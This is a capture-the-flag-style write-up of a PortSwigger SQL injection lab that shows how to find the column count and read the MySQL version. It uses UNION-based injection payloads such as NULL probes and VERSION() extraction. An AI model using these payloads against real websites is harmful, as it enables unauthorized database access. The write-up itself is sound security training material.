---
Category: SQL-Injection
LAB: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
Difficulty: Practitioner
---
---

So we are going to be doing a very similar thing as we did with the Oracle one : [lab](https://github.com/MarcussanMG/Cybersecurity-Writeups/blob/main/PortSwigger/SQL%20Injection/Practitioner/SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle.md)

So i am going to skip the explanation of `UNION` and go directly to the chase

![](../../../0.%20Assets/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft-1782863888932.webp)

I am first going to try with just one `NULL` and then move up from there

```
' Union select NULL -- -
```

![](../../../0.%20Assets/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft-1782863924286.webp)

As we can see we get an error so we might need more fields

```
' Union select NULL, NULL -- -
```

![](../../../0.%20Assets/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft-1782865141130.webp)

As we can see we didn't get an error so we know we have 2 columns, and now we just need to try one or the other field with `VERSION()` to get the version

```
' Union select VERSION(), NULL -- -
```

![](../../../0.%20Assets/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft-1782865259233.webp)


Also here is where i found how to get the `MySQL version`
- [Website](https://www.w3schools.com/MYSQL/func_mysql_version.asp)

